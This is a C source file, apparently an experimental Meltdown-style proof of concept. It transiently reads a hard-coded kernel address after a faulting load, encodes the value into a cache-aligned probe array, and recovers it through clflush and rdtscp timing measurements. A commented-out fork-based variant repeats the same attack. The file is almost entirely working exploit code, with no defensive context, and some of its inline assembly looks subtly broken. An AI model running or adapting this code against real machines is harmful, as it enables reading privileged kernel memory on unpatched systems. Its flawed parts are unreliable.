#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <ctype.h>
#include <limits.h>
#include <unistd.h> 
#include <sys/wait.h>
#include <malloc.h>
#include <signal.h>
#include <errno.h>
#include <sys/mman.h>


// kernel start location
// if there is no KASLR
#define PHYS_OFFSET 0xFFFF880000000000ul
#define THRESHOLD 100

void flushprobe(uint64_t* probe_array){
    // flush them all
    for (int i = 0; i < 256 * 512; i++)
    {
        asm volatile(
            "clflush (%0)"
            // out
            :
            // in
            :"r"(&probe_array[i]) 
        );
    }
}

uint64_t* prepare_probe(){
    uint64_t * probe_array = (uint64_t *) memalign(4096, 256 * 512 * sizeof(uint64_t));

    // set memory
    for(int i = 0; i < 256 * 512; i++){
        probe_array[i] = i + i;
    }
    return probe_array;
}
int flag=0;

#define handle_error(msg) \
    do { perror(msg); exit(EXIT_FAILURE); } while (0)

static void handler(int sig, siginfo_t *si, void *unused)
{
    printf("Got SIGSEGV at address: 0x%lx\n",(long) si->si_addr);
    printf("Implements the handler only\n");
    flag=1;
    //exit(EXIT_FAILURE);
}

int main()
{
    struct sigaction sa;

    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = handler;
    if (sigaction(SIGSEGV, &sa, NULL) == -1)
        handle_error("sigaction");

    uint64_t *kernel_pointer = (char *)PHYS_OFFSET;
    uint64_t *probe_array = prepare_probe();
    
    flushprobe(probe_array);

    register uint64_t readval;
        asm volatile(
            // clear rax
            "mov $0, %%rax\n"
            "mfence\n"
            // read the value that is pointed by kernel pointer
            // to the rax register
            "mov (%2), %%rax\n"
            // race condition begins
            // multiply by 4096
            "shl $12, %%rax\n"
            // compute the probe array address
            "add %%rax, %%rcx\n"
            "mov (%%rcx), %%rdx"
            :"=d"(readval), "+c"(&probe_array[0])
            :"b"(kernel_pointer)
            :"rax"
        );

    register uint64_t delta;
    uint64_t* differenceArray = (uint64_t *) malloc (256 * sizeof(uint64_t));


    // measure time differences for each element
    for (int i = 0; i < 256; i++)
    {
        asm volatile(
            // start timer
            "rdtscp\n"
            // move counter to the r10
            "mov %%rax, %%r10\n"
            // try to read element of probe array to the rax
            "mov (%1), %%rcx\n"
            // read the timer again
            "rdtscp;\n"
            // find the difference between measurements
            "sub %%r10, %%rax\n"
            // output
            : [delta]"=a"(delta)
            // input
            :"b"(&probe_array[i * 512])
            //:"rax","r10"
            :"rcx"
        );
        differenceArray[i] = delta;
    }
    for (int i = 0; i < 256; i++)
    {
        printf("i: %d\tdelta:%ld\n", i, differenceArray[i]);
    }

    
    /*
    if(fork()){
        register uint64_t readval;
        asm volatile(
            // clear rax
            "mov $0, %%rax\n"
            "mfence\n"
            // read the value that is pointed by kernel pointer
            // to the rax register
            "mov (%2), %%rax\n"
            // race condition begins
            // multiply by 4096
            "shl $12, %%rax\n"
            // compute the probe array address
            "add %%rax, %%rcx\n"
            "mov (%%rcx), %%rdx"
            :"=d"(readval), "+c"(&probe_array[0])
            :"b"(kernel_pointer)
            :"rax"
        );
    }   
    else{
        sleep(1.00);
        register uint64_t delta;
        uint64_t* differenceArray = (uint64_t *) malloc (256 * sizeof(uint64_t));

        // measure time differences for each element
        for (int i = 0; i < 256; i++)
        {
            asm volatile(
                // start timer
                "rdtscp\n"
                // move counter to the r10
                "mov %%rax, %%r10\n"
                // try to read element of probe array to the rax
                "mov (%1), %%rax\n"
                // read the timer again
                "rdtscp;\n"
                // find the difference between measurements
                "sub %%r10, %%rax\n"
                // output
                : [delta]"=a"(delta)
                // input
                :"b"(&probe_array[i * 512])
                //:"rax","r10"
            );
            differenceArray[i] = delta;
        }
        for (int i = 0; i < 256; i++)
        {
            printf("i: %d\tdelta:%ld\n", i, differenceArray[i]);
        }
        
    }
    */
    return 0;
}